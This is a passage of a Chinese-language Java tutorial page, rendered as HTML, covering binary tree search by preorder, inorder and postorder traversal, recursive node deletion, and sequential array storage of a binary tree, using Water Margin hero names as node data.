class="variable">node3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">3</span>, <span class="string">&quot;卢俊义&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">4</span>, <span class="string">&quot;林冲&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">5</span>, <span class="string">&quot;关胜&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先手动创建该二叉树，后面学习递归的方式创建二叉树</span></span><br><span class="line">root.setLeft(node2);</span><br><span class="line">root.setRight(node3);</span><br><span class="line">node3.setRight(node4);</span><br><span class="line">node3.setLeft(node5);</span><br><span class="line">binaryTree.setRoot(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序遍历查找的次数 4次</span></span><br><span class="line">System.out.println(<span class="string">&quot;前序遍历方式~~~&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">resNode</span> <span class="operator">=</span> binaryTree.preOrderSearch(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (resNode != <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;找到了，信息为 no=%d name=%s&quot;</span>, resNode.getNo(), resNode.getName());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;没有找到 no = %d 的英雄&quot;</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历查找的次数 3次</span></span><br><span class="line"><span class="comment">//System.out.println(&quot;中序遍历方式~~~&quot;);</span></span><br><span class="line"><span class="comment">//HeroNode resNode = binaryTree.infixOrderSearch(5);</span></span><br><span class="line"><span class="comment">//if (resNode != null) &#123;</span></span><br><span class="line"><span class="comment">//System.out.printf(&quot;找到了，信息为 no=%d name=%s&quot;, resNode.getNo(), resNode.getName());</span></span><br><span class="line"><span class="comment">//&#125; else &#123;</span></span><br><span class="line"><span class="comment">//System.out.printf(&quot;没有找到 no = %d 的英雄&quot;, 5);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历查找的次数  2次</span></span><br><span class="line"><span class="comment">//System.out.println(&quot;后序遍历方式~~~&quot;);</span></span><br><span class="line"><span class="comment">//HeroNode resNode = binaryTree.postOrderSearch(5);</span></span><br><span class="line"><span class="comment">//if (resNode != null) &#123;</span></span><br><span class="line"><span class="comment">//System.out.printf(&quot;找到了，信息为 no=%d name=%s&quot;, resNode.getNo(), resNode.getName());</span></span><br><span class="line"><span class="comment">//&#125; else &#123;</span></span><br><span class="line"><span class="comment">//System.out.printf(&quot;没有找到 no = %d 的英雄&quot;, 5);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> HeroNode root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(HeroNode root)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.root = root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历查找</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">preOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> root.preOrderSearch(no);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历查找</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">infixOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> root.infixOrderSearch(no);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历查找</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">postOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.root.postOrderSearch(no);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> HeroNode left;</span><br><span class="line"><span class="keyword">private</span> HeroNode right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode</span><span class="params">(<span class="type">int</span> no, String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNo</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getLeft</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeft</span><span class="params">(HeroNode left)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left = left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getRight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRight</span><span class="params">(HeroNode right)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right = right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">preOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;进入前序遍历&quot;</span>);</span><br><span class="line"><span class="comment">// 比较当前结点是不是</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.no == no) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1.判断当前结点的左子节点是否为空，如果不为空，则递归前序查找</span></span><br><span class="line"><span class="comment">// 2.如果左递归前序查找，找到结点，则返回</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">resNode</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.left.preOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resNode != <span class="literal">null</span>) &#123;<span class="comment">// 说明我们左子树找到</span></span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1.左递归前序查找，找到结点，则返回，否继续判断，</span></span><br><span class="line"><span class="comment">// 2.当前的结点的右子节点是否为空，如果不空，则继续向右递归前序查找</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.right.preOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历查找</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">infixOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">resNode</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.left.infixOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resNode != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;进入中序查找&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.no == no) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.right.infixOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历查找</span></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">postOrderSearch</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">resNode</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.left.postOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resNode != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line">resNode = <span class="built_in">this</span>.right.postOrderSearch(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resNode != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;进入后序查找&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.no == no) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resNode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除结点的代码实现"><a href="#删除结点的代码实现" class="headerlink" title="删除结点的代码实现"></a>删除结点的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 先创建一颗二叉树</span></span><br><span class="line"><span class="type">BinaryTree</span> <span class="variable">binaryTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinaryTree</span>();</span><br><span class="line"><span class="comment">// 创建需要的结点</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">1</span>, <span class="string">&quot;宋江&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">2</span>, <span class="string">&quot;吴用&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">3</span>, <span class="string">&quot;卢俊义&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">4</span>, <span class="string">&quot;林冲&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">5</span>, <span class="string">&quot;关胜&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先手动创建该二叉树，后面学习递归的方式创建二叉树</span></span><br><span class="line">root.setLeft(node2);</span><br><span class="line">root.setRight(node3);</span><br><span class="line">node3.setRight(node4);</span><br><span class="line">node3.setLeft(node5);</span><br><span class="line">binaryTree.setRoot(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一把删除结点</span></span><br><span class="line">System.out.println(<span class="string">&quot;删除前,前序遍历&quot;</span>);</span><br><span class="line">binaryTree.preOrder(); <span class="comment">// 1,2,3,5,4</span></span><br><span class="line">binaryTree.delNode(<span class="number">5</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;删除后，前序遍历&quot;</span>);</span><br><span class="line">binaryTree.preOrder(); <span class="comment">// 1,2,3,4</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> HeroNode root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(HeroNode root)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.root = root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除结点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delNode</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 如果只有一个root结点, 这里立即判断root是不是就是要删除结点</span></span><br><span class="line"><span class="keyword">if</span> (root.getNo() == no) &#123;</span><br><span class="line">root = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 递归删除</span></span><br><span class="line">root.delNode(no);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;空树，不能删除~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.root.preOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;二叉树为空，无法遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> HeroNode left;</span><br><span class="line"><span class="keyword">private</span> HeroNode right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode</span><span class="params">(<span class="type">int</span> no, String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNo</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getLeft</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeft</span><span class="params">(HeroNode left)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left = left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getRight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRight</span><span class="params">(HeroNode right)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right = right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归删除结点</span></span><br><span class="line"><span class="comment">// 1.如果删除的节点是叶子节点，则删除该节点</span></span><br><span class="line"><span class="comment">// 2.如果删除的节点是非叶子节点，则删除该子树</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delNode</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="comment">// 1.因为我们的二叉树是单向的，所以我们是判断当前结点的子结点是否需要删除结点，而不能去判断当前这个结点是不是需要删除结点.  </span></span><br><span class="line"><span class="comment">// 2.如果当前结点的左子结点不为空，并且左子结点就是要删除结点，就将this.left = null; 并且就返回(结束递归删除)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.left.no == no) &#123;</span><br><span class="line"><span class="built_in">this</span>.left = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3.如果当前结点的右子结点不为空，并且右子结点就是要删除结点，就将this.right= null ;并且就返回(结束递归删除)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.right.no == no) &#123;</span><br><span class="line"><span class="built_in">this</span>.right = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4.我们就需要向左子树进行递归删除</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.delNode(no);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 5.则应当向右子树进行递归删除</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.delNode(no);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.preOrder();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.preOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="顺序存储二叉树"><a href="#顺序存储二叉树" class="headerlink" title="顺序存储二叉树"></a>顺序存储二叉树</h1><p>从数据存储来看，数组存储方式和树的存储方式可以相互转换，即数组可以转换成树，树也可以转换成数组。</p><p><strong>顺序存储二叉树的特点:</strong> (i表示二叉树中的第几个元素(从0开始编号))</p><blockquote><ol><li>顺序二叉树通常只考虑完全二叉树</li><li>第i个元素的左子节点为  2 * i + 1 </li><li>第i个元素的右子节点为  2 * i + 2</li><li>第i个元素的父节点为  (i-1) &#x2F; 2</li></ol></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214949.png"></p><hr><p>需求: 给定数组为{1,2,3,4,5,6,7}，要求以二叉树前序遍历的方式进行遍历。 前序遍历的结果应当为 1,2,4,5,3,6,7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrBinaryTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> &#125;;</span><br><span class="line"><span class="type">ArrBinaryTree</span> <span class="variable">tree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrBinaryTree</span>(arr);</span><br><span class="line">tree.preOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrBinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] arr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ArrBinaryTree</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.arr = arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line">preOrder(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (arr == <span class="literal">null</span> || arr.length &lt; <span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;数组为空，不能按照二叉树前序遍历。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.print(arr[index]);</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">2</span> * index + <span class="number">1</span>) &lt; arr.length) &#123;<span class="comment">// 防止索引越界</span></span><br><span class="line">preOrder(<span 